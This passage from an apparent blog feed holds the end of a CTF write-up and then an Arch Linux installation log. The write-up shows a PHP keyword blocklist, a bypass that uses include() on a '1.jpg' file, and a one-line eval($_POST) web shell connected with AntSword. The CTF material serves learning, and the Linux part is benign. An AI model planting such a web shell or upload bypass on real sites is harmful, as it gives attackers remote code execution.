class="string">&#x27;ch&#x27;</span>,<span class="string">&#x27;scandir&#x27;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;call&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;url&quot;</span>,<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>(), <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$dangerous</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">                <span class="variable">$res</span> = <span class="title function_ invoke__">stristr</span>(<span class="variable">$line</span>,<span class="variable">$value</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$res</span> != <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">        retur</span><br><span class="line">n <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>禁了很多东西，没禁用单引号，在大佬的提示下考虑include文件包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;1.jpg&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.jpg</span><br><span class="line"> <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;leon&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>都上传后，蚁剑连接 xxx&#x2F;xxxx&#x2F;include.php </p><p>就成了</p><h3 id="9-🏭-EzPollution-pre"><a href="#9-🏭-EzPollution-pre" class="headerlink" title="9.🏭 EzPollution_pre"></a>9.🏭 EzPollution_pre</h3><p>这题注意nodejs容器使用一次就损坏了，所以在本地跑通，重启会方便一点</p><p>然后根据原型链污染的原理像图中这样post,注意要用js的函数把flag给cat出来</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450db13d87c.png"></p><p>CNSS{v2ry_ea5y_N0dejs}</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450db20075c.png"></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="1-📦-Bin-Guideline"><a href="#1-📦-Bin-Guideline" class="headerlink" title="1.📦 Bin Guideline"></a>1.📦 Bin Guideline</h3><p>无话可说</p><h3 id="2-😍-那个女人"><a href="#2-😍-那个女人" class="headerlink" title="2.😍 那个女人"></a>2.😍 那个女人</h3><p>打开就送</p><h3 id="3-😢-我的flag碎了一地"><a href="#3-😢-我的flag碎了一地" class="headerlink" title="3.😢 我的flag碎了一地"></a>3.😢 我的flag碎了一地</h3><p>F5</p><p>根据提示打开String窗口</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450db31ed75.png"></p><p>第二段在function找到</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450db40b413.png"></p><p>第三段右键查看引用图</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450db5091b5.png"></p><p>找到func718</p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450db5eb556.png"></p><p><img src="G:\hexo-blog\source_posts\CNSS-Recruit-2023-Writeup.assets\65450db6dd0c6.png"></p><p>拼接一下CNSS{My_fl@g_h4s_br0ken_4parT_ Bu7_Y0u_c@n_f1x_1t!}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CNSS-Recruit-2023-Writeup&quot;&gt;&lt;a href=&quot;#CNSS-Recruit-2023-Writeup&quot; class=&quot;headerlink&quot; title=&quot;CNSS Recruit 2023 Writeup&quot;&gt;&lt;/a&gt;CNSS Recrui</summary>
      
    
    
    
    <category term="writeup" scheme="https://foreon.github.io/categories/writeup/"/>
    
    
    <category term="ctf" scheme="https://foreon.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>安装Arch Linux的记录</title>
    <link href="https://foreon.github.io/posts/54882.html"/>
    <id>https://foreon.github.io/posts/54882.html</id>
    <published>2023-12-02T18:03:57.000Z</published>
    <updated>2023-12-02T18:15:11.710Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装Arch-Linux的记录"><a href="#安装Arch-Linux的记录" class="headerlink" title="安装Arch Linux的记录"></a>安装Arch Linux的记录</h1><p>第一次安装双系统，虽然是参考b站教程的，但还是很有成就感，故记录一下这个过程，顺便仔细学习一下各个命令的作用。</p><p>本文仅为学习记录，文末给出了参考来源，若有侵权请联系我删除🙏</p><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ol><li>首先登录官网从国内镜像源下载arch linux系统镜像</li><li>下载rufus烧录arch linux镜像到U盘，默认设置就行</li></ol><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b709c2e8c6.png" alt="image-20231202223105417"></p><ol start="3"><li>为arch linux分配磁盘空间，大概20G就够用</li></ol><p>​       我这里能压缩的磁盘空间很少，但这个盘还剩很多空间，于是我使用了傲梅分区助手</p><h3 id="设置网络"><a href="#设置网络" class="headerlink" title="设置网络"></a>设置网络</h3><p>重启进入bios,设置为从u盘启动，开始安装arch linux</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b709d4c47d.png" alt="image-20231202224005368"></p><p><code>rfkill list</code>查看列表</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b709e6785e.png" alt="image-20231202223727234"></p><p><code>rfkill unblock wifi</code>解除wifi锁定</p><p><code>ip link</code>查看网卡，一般网卡名为wlan0</p><p><code>ip link set wlan0 up</code>启用网卡</p><blockquote><p>ip link set DEVICE  { up | down | arp { on | off } | name NEWNAME | address LLADDR }<br>选项说明：<br>dev DEVICE：指定要操作的设备名<br>up and down：启动或停用该设备<br>arp on or arp off：启用或禁用该设备的arp协议<br>name NAME：修改指定设备的名称，建议不要在该接口处于运行状态或已分配IP地址时重命名<br>address LLADDRESS：设置指定接口的MAC地址</p></blockquote><p>连接wifi </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iwctl   <span class="comment">//在 Linux 中，&quot;ctl&quot; 通常代表 &quot;control&quot; 或 &quot;controller&quot;。例如，在 SysV 初始化系统中，/etc/init.d 目录下的脚本通常以 &quot;ctl&quot; 作为后缀，表示它们是用于控制系统服务的控制器。此外，在某些驱动程序中，CTL 可能代表 &quot;control&quot;，表示该驱动程序控制某个设备的操作。</span></span><br><span class="line">station wlan0 scan</span><br><span class="line">    </span><br><span class="line">station wlan0 get-networks</span><br><span class="line">    </span><br><span class="line">station wlan0 connect [wifi名字] <span class="comment">//这里有个小技巧，如果遇到中文乱码，可以打出前面的非中文字符，再按下Tab匹配</span></span><br><span class="line"><span class="comment">//接着输入密码</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">    </span><br><span class="line">ping baidu.com   <span class="comment">//检查网络是否正常</span></span><br></pre></td></tr></table></figure><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b709fb81ee.png" alt="image-20231202224913623"></p><h3 id="设置时间同步"><a href="#设置时间同步" class="headerlink" title="设置时间同步"></a>设置时间同步</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timedatectl <span class="built_in">set</span>-ntp <span class="literal">true</span> <span class="comment">//开启ntp时间同步</span></span><br><span class="line">    </span><br><span class="line">timedatectl status</span><br></pre></td></tr></table></figure><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70a0eddb4.png" alt="image-20231202225330770"></p><h3 id="分配磁盘空间"><a href="#分配磁盘空间" class="headerlink" title="分配磁盘空间"></a>分配磁盘空间</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l  <span class="comment">//查看磁盘状态</span></span><br><span class="line">    </span><br><span class="line">fdisk /dev/nvme...n.... <span class="comment">//nvme...n....  由图为刚刚为arch linux分配空间的磁盘</span></span><br></pre></td></tr></table></figure><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70a1e1af0.png" alt="image-20231202225956849">      <img src="https://bu.dusays.com/2023/12/03/656b70a3547a5.png" alt="image-20231202225904146" style="zoom:150%;" /></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//p 查看布局</span></span><br><span class="line"><span class="comment">//n 新建分区</span></span><br><span class="line">n</span><br><span class="line"><span class="number">7</span>  <span class="comment">//这里给出为linux的交换分区给出空间的磁盘的序号</span></span><br><span class="line">+<span class="number">4</span>G <span class="comment">//这里建立linux的交换分区，大小为4GB</span></span><br><span class="line">n</span><br><span class="line"><span class="comment">//直接回车表示把剩余默认空间都给linux的根分区</span></span><br></pre></td></tr></table></figure><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70a468a2f.png" alt="image-20231202231143106"></p><blockquote><p>UEFI是指主板的引导启动方式</p><p>GPT是硬盘的分区模式</p><p>EFI是GPT硬盘分区模式中的系统启动分区</p><p>EFI分区全称是EFI system partition，一般简写成EFI分区或者ESP分区</p></blockquote><p><strong>EFI分区是用来引导系统启动的</strong></p><p>分配好的空间如图</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70a5d0950.png" alt="image-20231202231551277"></p><h3 id="分区格式化"><a href="#分区格式化" class="headerlink" title="分区格式化"></a>分区格式化</h3><blockquote><p>创建好的分区必须格式化为一种文件系统，Linux 上常见的文件系统有 ext4，btrfs，xfs 等。建议第一次安装的读者使用 ext4 文件系统。btrfs 提供子卷、写时复制、压缩、快照等高级功能，适合更加熟练的用户。</p></blockquote><p>mkfs命令</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70a6c1bbf.png" alt="image-20231202231817070"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkfs.btrfs /dev/nvme...n..<span class="number">.1</span>  <span class="comment">//将根目录分区格式化为btrfs文件系统</span></span><br><span class="line">    </span><br><span class="line">mkswap /dev/nvme...n..<span class="number">.2</span> <span class="comment">//对交换分区进行操作，mkswap命令用于在一个文件或者设备上建立交换分区。在建立完之后要使用sawpon命令开始使用这个交换区。最后一个选择性参数指定了交换区的大小，但是这个参数是为了向后兼容设置的，没有使用的必要，一般都将整个文件或者设备作为交换区。</span></span><br><span class="line">swapon /dev/nvme...n..<span class="number">.2</span>  </span><br></pre></td></tr></table></figure><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70a7c239e.png" alt="image-20231202232822725"></p><h3 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h3><blockquote><p>mount命令的功能是将文件系统挂载到目录</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line">    </span><br><span class="line">mount /dev/nvme1n.... /mnt <span class="comment">//将根分区挂载</span></span><br><span class="line">    </span><br><span class="line">mkdir /mnt/boot <span class="comment">//根目录下生成文件夹boot</span></span><br><span class="line">    </span><br><span class="line">mount dev/nvme0n.... /mnt/boot <span class="comment">//将引导分区挂载到/mnt/boot下</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//mnt - 此目录主要是作为挂载点使用。通常包括系统引导后被挂载的文件系统的挂载点。如挂载Windows下的某个分区。</span></span><br></pre></td></tr></table></figure><p><em><strong>最终的布局</strong></em></p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70a8ebac8.png"></p><p>从上到下分别是 <em><strong>引导分区、根分区、交换分区</strong></em></p><blockquote><p>Linux分区和挂载是Linux系统管理硬盘的两个重要概念。分区是将硬盘划分为不同的逻辑区域，以便存储不同类型的数据和文件。挂载是将一个分区与一个目录联系起来，使得该目录可以访问该分区中的数据和文件。<br>linux为什么要挂载？ 如果硬盘是一片空地，那么分区和挂载就是把一片空地建成不同的房间（分区），每个房间存放不同类型的货物，再把房间的钥匙发给使用这个房间里的货物的人（挂载）。如果不挂载，那么人要使用某个货物时，就会因为没有钥匙而无法使用这个货物。<br>为什么不直接访问&#x2F;dev目录？ 直接访问&#x2F;dev目录，就相当于把房间都拆了，直接从空地上寻找需要的货物，这不方便，也不安全（空地货物可能会被弄乱）<br>Linux分区和挂载有以下几个用途：<br>提高系统的安全性。没有挂载的分区是无法访问的，这样可以防止恶意用户或程序对系统造成破坏。<br>提高系统的效率。通过合理地划分和挂载分区，可以减少系统维护文件的规模，提高磁盘空间的利用率和读写速度。<br>适应多用户操作系统。Linux是一个多用户操作系统，不同用户可能有不同的权限和需求。通过分区和挂载，可以实现对用户空间、临时文件、日志文件等的隔离和管理。</p></blockquote><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70aa9470c.jpeg" alt="img"></p><h3 id="选择软件镜像源"><a href="#选择软件镜像源" class="headerlink" title="选择软件镜像源"></a>选择软件镜像源</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/pacman.d/mirrorlist <span class="comment">//手动添加镜像</span></span><br><span class="line">    </span><br><span class="line">Server =https:<span class="comment">//mirrors.ustc.edu.cn/archlinux/$repo/os/$arch</span></span><br><span class="line">Server =......</span><br><span class="line"><span class="comment">//ctrl+x保存退出</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70ac2437e.png" alt="image-20231202235356804"></p><blockquote><p>在 Arch Linux 中，软件仓库就好比手机中的应用商店，软件包是通过软件仓库进行分发的。软件仓库镜像是软件仓库的复制品，同一个软件仓库可以在世界各地建立软件仓库镜像，以便于不同地区的用户下载。因此选择一个合适的软件仓库镜像对于您更新软件包数据库以及下载软件包的速度有很大影响。</p></blockquote><p>pacman命令</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70ad3a55b.png" alt="image-20231202235029820"></p><p>nano编辑器</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70ae23968.png" alt="image-20231202234934124">、</p><h3 id="安装基础包"><a href="#安装基础包" class="headerlink" title="安装基础包"></a>安装基础包</h3><blockquote><p>我们使用 pacstrap 安装 base，linux，linux-firmware 三个软件包，它们分别是基础包组，linux 内核和驱动程序。此外，如果您使用 2019 年及以后生产的笔记本电脑，可能需要安装 sof-firmware，否则可能没有声音[<a href="https://zhuanlan.zhihu.com/p/596227524#ref_23">23]</a>。</p><p>Arch linux 官方提供了 linux，linux-lts，linux-zen，linux-hardened 内核[<a href="https://zhuanlan.zhihu.com/p/596227524#ref_24">24]</a>，但是对于初学者，只推荐使用 linux 内核。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacstrap -K /mnt base base-devel linux linux-firmware sudo nano vim networkmanager intel-ucode</span><br><span class="line"><span class="comment">//安装base,base-devel,linux,linux-firmware,sudo,nano,vim,networkmanager,intel-ucode</span></span><br><span class="line"><span class="comment">//intel-ucode是CPU微码，用于intel的cpu固件更新？？？这里我不确定(</span></span><br></pre></td></tr></table></figure><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70af5cf73.png" alt="image-20231202235643268"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -Sy archlinux-keyring <span class="comment">//如若报错则需更新keyring</span></span><br><span class="line">    </span><br><span class="line">pacstrap -K /mnt base base-devel linux linux-firmware sudo nano vim networkmanager intel-ucode <span class="comment">//然后重新安装</span></span><br></pre></td></tr></table></figure><p>fstab是一个系统文件，决定了系统启动时如何自动挂载分区。没有 fstab，系统将找不到根分区，从而无法启动。fstab 有一定的格式，我们用一个例子说明 fstab 文件的格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genfstab -U/mnt &gt;&gt; /mnt/ect/fstab  </span><br></pre></td></tr></table></figure><p>其中“genfstab -U &#x2F;mnt”是以 UUID 的描述方式生成 fstab，“&gt;&gt;” 的意思是，将输出结果附加在后面的文件之后。</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70b02dfd4.png" alt="image-20231203000926638"></p><p>生成完成后，记得使用 cat 命令打印文件内容，仔细检查一遍。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /mnt/etc/fstab</span><br></pre></td></tr></table></figure><h3 id="使用chroot"><a href="#使用chroot" class="headerlink" title="使用chroot"></a>使用chroot</h3><p>使用chroot切换到安装的新系统</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure><p>这里我顿悟了，之前的根目录在&#x2F;mnt下，这里chroot直接把根目录移动回系统&#x2F;下，&#x2F;mnt相当于完成汉诺塔的倒数第二步</p><p>chroot命令</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70b1432ba.png" alt="image-20231203001312188"></p><h3 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime <span class="comment">//设置上海时间</span></span><br><span class="line">    </span><br><span class="line">hwclock --systohc <span class="comment">//设置硬件时间</span></span><br></pre></td></tr></table></figure><p>ln命令   </p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70b259d6d.png" alt="image-20231203001502785"></p><p>hwclock命令</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70b39a481.png" alt="image-20231203001608909"></p><h3 id="本地化"><a href="#本地化" class="headerlink" title="本地化"></a>本地化</h3><blockquote><p>我们将设置 locale、终端键盘布局和字体。locale 决定了系统的语言和格式，包括终端显示哪种语言，数字、时间和货币以哪国的格式显示等等。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/locale.gen</span><br><span class="line"><span class="comment">//取消en_US.UTF-8 和zh_CN.UTF-8前的注释</span></span><br><span class="line">locale-gen <span class="comment">//生成locale</span></span><br></pre></td></tr></table></figure><img src="G:\hexo-blog\source\_posts\安装Arch-Linux的记录.assets\656b70b4a7751.png" alt="image-20231203004524408" style="zoom: 200%;" /><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70b5ab949.png" alt="image-20231203004557543"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/locale.conf <span class="comment">//修改locale.conf文件</span></span><br><span class="line"><span class="comment">//输入LANG=en_US.UTF-8，ctrl+x保存</span></span><br></pre></td></tr></table></figure><img src="G:\hexo-blog\source\_posts\安装Arch-Linux的记录.assets\656b70b67a922.png" alt="image-20231203004942416" style="zoom:200%;" /><h3 id="确定系统名和网络管理系统配置"><a href="#确定系统名和网络管理系统配置" class="headerlink" title="确定系统名和网络管理系统配置"></a>确定系统名和网络管理系统配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/hostname</span><br><span class="line">//输入archlinux，确定系统名</span><br><span class="line">systemctl enable NetworkManager//注意大小写</span><br><span class="line">//使用 systemd 设置 NetworkManager 开机自动启动</span><br></pre></td></tr></table></figure><h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><blockquote><p>root 用户是 Linux 系统中权限最高的用户，有些敏感的操作必须通过 root 用户进行，比如使用 pacman。我们之前进行所有的操作也都是以 root 用户进行的。也正是因为 root 的权限过高，如果使用不当会造成安全问题，所以我们在下一篇文章中会新建一个普通用户来进行日常的操作。在这里我们需要为 root 用户设置一个密码。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br><span class="line"><span class="comment">//输入密码，这里不会显示已经输入的密码</span></span><br><span class="line"><span class="comment">//再次输入密码</span></span><br></pre></td></tr></table></figure><img src="G:\hexo-blog\source\_posts\安装Arch-Linux的记录.assets\656b70b77dbc6.png" alt="image-20231203005458592" style="zoom:200%;" /><h3 id="新建普通用户"><a href="#新建普通用户" class="headerlink" title="新建普通用户"></a>新建普通用户</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">useradd -m -G wheel -s /bin/bash [username] <span class="comment">//将用户添加到wheel组，root也在wheel组</span></span><br><span class="line">    </span><br><span class="line">passwd [username]</span><br><span class="line"><span class="comment">//输入密码并重复输入确定</span></span><br></pre></td></tr></table></figure><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70b863b2a.png" alt="image-20231203005911850"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">visudo <span class="comment">//打开/etc/sudoers文件进行编辑设置sudo</span></span><br><span class="line"><span class="comment">//这里使用传统vim编辑器，按i进入编辑模式，按esc退出编辑模式，输入:wq退出保存</span></span><br><span class="line"><span class="comment">//取消%wheel ALL前的注释</span></span><br></pre></td></tr></table></figure><img src="G:\hexo-blog\source\_posts\安装Arch-Linux的记录.assets\656b70b980409.png" alt="image-20231203010135452" style="zoom:200%;" /><p>这里的意思是让wheel组下的所有用户都能免去输入密码使用sudo权限</p><p>sudo权限</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70ba68548.png" alt="image-20231203010514566"></p><h3 id="Grub安装"><a href="#Grub安装" class="headerlink" title="Grub安装"></a>Grub安装</h3><blockquote><h2 id="GRUB-是什么？"><a href="#GRUB-是什么？" class="headerlink" title="GRUB 是什么？"></a>GRUB 是什么？</h2><p><a href="https://link.zhihu.com/?target=https://www.gnu.org/software/grub/">GRUB</a> 是一个用于加载和管理系统启动的完整程序。它是 Linux 发行版中最常见的*引导程序(bootloader)*。引导程序是计算机启动时运行的第一个软件。它加载 <a href="https://link.zhihu.com/?target=https://itsfoss.com/what-is-linux/">操作系统的内核</a>，然后再由内核初始化操作系统的其他部分（包括 Shell、<a href="https://link.zhihu.com/?target=https://linux.cn/article-12773-1.html">显示管理器</a>、<a href="https://link.zhihu.com/?target=https://linux.cn/article-12579-1.html">桌面环境</a> 等等）。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -S grub efibootmgr os-prober <span class="comment">//安装系统探测器</span></span><br><span class="line">    </span><br><span class="line">nano /etc/<span class="keyword">default</span>/grub</span><br></pre></td></tr></table></figure><p><strong>新版grub默认禁用os-prober,需要手动启用</strong></p><img src="G:\hexo-blog\source\_posts\安装Arch-Linux的记录.assets\656b70bb87859.png" alt="image-20231203011100286" style="zoom:200%;" /><p>去掉GRUB_DISABLE前面的注释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUB <span class="comment">//安装Grub</span></span><br><span class="line">    </span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg <span class="comment">//生成Grub配置</span></span><br></pre></td></tr></table></figure><h3 id="手动添加Windows启动项"><a href="#手动添加Windows启动项" class="headerlink" title="手动添加Windows启动项"></a>手动添加Windows启动项</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blkid /dev/nvme0n......  <span class="comment">//查看引导分区信息</span></span><br></pre></td></tr></table></figure><p>blkid命令</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70bc6a924.png" alt="image-20231203011827063">记录下UUID后面的数字</p><img src="G:\hexo-blog\source\_posts\安装Arch-Linux的记录.assets\656b70bd59e1a.png" alt="image-20231203011909438" style="zoom:200%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano/boot/grub/grub.cfg</span><br></pre></td></tr></table></figure><p>有概率os-prober无法探测到windows,需要手动添加windows启动项</p><p><img src="G:\hexo-blog\source_posts\安装Arch-Linux的记录.assets\656b70beecb78.png" alt="image-20231203012234078"></p><p><strong>输入红框中的内容，红圈中的内容为刚刚记下来的数字</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> <span class="comment">//保存后退出</span></span><br><span class="line">    </span><br><span class="line">umount -R /mnt <span class="comment">// /mnt完成了它的使命，把它卸载掉</span></span><br><span class="line">    </span><br><span class="line">reboot <span class="comment">//重启查看能否正常启动Windows</span></span><br></pre></td></tr></table></figure><h3 id="进入Arch-Linux美化"><a href="#进入Arch-Linux美化" class="headerlink" title="进入Arch Linux美化"></a>进入Arch Linux美化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root <span class="comment">//输入密码登录root账户</span></span><br></pre></td></tr></table></figure><p>重复之前的联网操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rfkill unblock wifi</span><br><span class="line"></span><br><span class="line">ip link</span><br><span class="line"></span><br><span class="line">ip link set wlan0 up</span><br><span class="line"></span><br><span class="line">iwctl </span><br><span class="line"></span><br><span class="line">station wlan0 scan</span><br><span class="line"></span><br><span class="line">station wlan0 get-networks</span><br><span class="line"></span><br><span class="line">station wlan0 connect [wifi名字]</span><br><span class="line"></span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">ping baidu.com </span><br></pre></td></tr></table></figure><h4 id="安装Gnome桌面"><a href="#安装Gnome桌面" class="headerlink" 